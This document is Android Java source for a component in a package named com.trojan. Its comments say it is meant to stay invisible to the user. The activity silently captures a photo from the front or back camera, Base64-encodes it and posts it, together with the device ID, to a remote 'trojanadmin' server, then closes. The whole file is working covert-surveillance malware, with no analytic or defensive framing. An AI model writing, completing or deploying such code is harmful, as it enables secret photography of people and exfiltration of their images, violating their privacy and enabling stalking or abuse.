package com.trojan;

import android.Manifest;
import android.annotation.SuppressLint;
import android.content.ContentValues;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.camera.core.CameraSelector;
import androidx.camera.core.ImageCapture;
import androidx.camera.core.ImageCaptureException;
import androidx.camera.core.Preview;
import androidx.camera.lifecycle.ProcessCameraProvider;
import androidx.camera.view.PreviewView;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.Volley;
import com.google.common.util.concurrent.ListenableFuture;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

// This activity is designed to be invisible to the user.
// It opens, takes a picture, sends the data, and closes immediately.
public class CameraActivity extends AppCompatActivity {
    private static final String TAG = "CameraActivity";
    private static final String SUBMIT_DATA_URL = "https://trojanadmin.netlify.app/.netlify/functions/submit-data";
    private static final int CAMERA_PERMISSION_REQUEST_CODE = 102;

    private ExecutorService cameraExecutor;
    private ImageCapture imageCapture;
    private RequestQueue requestQueue;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // We don't need a visible layout for this background task.
        // setContentView(R.layout.activity_camera);

        cameraExecutor = Executors.newSingleThreadExecutor();
        requestQueue = Volley.newRequestQueue(this);

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) {
            startCameraAndCapture();
        } else {
            // This is a fallback. Permissions should be granted from MainActivity.
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA}, CAMERA_PERMISSION_REQUEST_CODE);
        }
    }

    private void startCameraAndCapture() {
        int cameraId = getIntent().getIntExtra("camera_id", 0); // 0 for back, 1 for front
        int cameraSelectorId = (cameraId == 1) ? CameraSelector.LENS_FACING_FRONT : CameraSelector.LENS_FACING_BACK;
        CameraSelector cameraSelector = new CameraSelector.Builder().requireLensFacing(cameraSelectorId).build();

        ListenableFuture<ProcessCameraProvider> cameraProviderFuture = ProcessCameraProvider.getInstance(this);

        cameraProviderFuture.addListener(() -> {
            try {
                ProcessCameraProvider cameraProvider = cameraProviderFuture.get();

                imageCapture = new ImageCapture.Builder().build();

                // Bind the lifecycle. Since this activity has no preview, we don't bind a Preview use case.
                cameraProvider.bindToLifecycle(this, cameraSelector, imageCapture);

                // Now that the camera is ready, take the picture.
                takePictureAndSubmit();

            } catch (Exception e) {
                Log.e(TAG, "CameraX initialization failed", e);
                submitDataToServer("picture_error", "Camera init failed: " + e.getMessage());
                finish(); // Close the activity on failure
            }
        }, ContextCompat.getMainExecutor(this));
    }

    private void takePictureAndSubmit() {
        if (imageCapture == null) {
            submitDataToServer("picture_error", "ImageCapture not initialized.");
            finish();
            return;
        }

        ImageCapture.OutputFileOptions outputFileOptions = new ImageCapture.OutputFileOptions.Builder(
                getContentResolver(),
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                new ContentValues()
        ).build();

        imageCapture.takePicture(ContextCompat.getMainExecutor(this), new ImageCapture.OnImageCapturedCallback() {
            @Override
            public void onCaptureSuccess(@NonNull androidx.camera.core.ImageProxy image) {
                super.onCaptureSuccess(image);
                try {
                    // Convert the image to a Base64 string
                    @SuppressLint("UnsafeOptInUsageError")
                    InputStream inputStream = new InputSource(image.getImage()).getInputStream();
                    byte[] bytes = getBytes(inputStream);
                    String encodedImage = Base64.encodeToString(bytes, Base64.DEFAULT);

                    submitDataToServer("picture", encodedImage);

                } catch (Exception e) {
                    Log.e(TAG, "Failed to process captured image", e);
                    submitDataToServer("picture_error", "Image processing failed.");
                } finally {
                    image.close();
                    finish(); // Ensure activity closes after capture
                }
            }

            @Override
            public void onError(@NonNull ImageCaptureException exception) {
                Log.e(TAG, "Image capture failed: " + exception.getMessage(), exception);
                submitDataToServer("picture_error", "Capture failed: " + exception.getMessage());
                finish(); // Close activity on error
            }
        });
    }

    private void submitDataToServer(String dataType, String payload) {
        JSONObject postData = new JSONObject();
        try {
            String deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
            postData.put("deviceId", deviceId);
            postData.put("dataType", dataType);
            postData.put("payload", payload);
        } catch (JSONException e) {
            Log.e(TAG, "Could not create submission JSON", e);
            return;
        }
        JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, SUBMIT_DATA_URL, postData,
                response -> Log.i(TAG, "Data submitted successfully: " + dataType),
                error -> Log.e(TAG, "Failed to submit data '" + dataType + "': " + error.toString())
        );
        requestQueue.add(request);
    }

    // Helper to convert InputStream to byte array
    private byte[] getBytes(InputStream inputStream) throws Exception {
        ByteArrayOutputStream byteBuffer = new ByteArrayOutputStream();
        int bufferSize = 1024;
        byte[] buffer = new byte[bufferSize];
        int len;
        while ((len = inputStream.read(buffer)) != -1) {
            byteBuffer.write(buffer, 0, len);
        }
        return byteBuffer.toByteArray();
    }
    
    // A helper class to get an InputStream from an ImageProxy
    private static class InputSource {
        private final android.media.Image image;
        public InputSource(android.media.Image image) {
            this.image = image;
        }
        public InputStream getInputStream() {
            // Simplified logic; assumes JPEG format
            android.media.Image.Plane[] planes = image.getPlanes();
            java.nio.ByteBuffer buffer = planes[0].getBuffer();
            byte[] bytes = new byte[buffer.remaining()];
            buffer.get(bytes);
            return new java.io.ByteArrayInputStream(bytes);
        }
    }


    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == CAMERA_PERMISSION_REQUEST_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                startCameraAndCapture();
            } else {
                submitDataToServer("picture_error", "Camera permission denied.");
                finish(); // Close if permission is denied
            }
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        cameraExecutor.shutdown();
    }
}
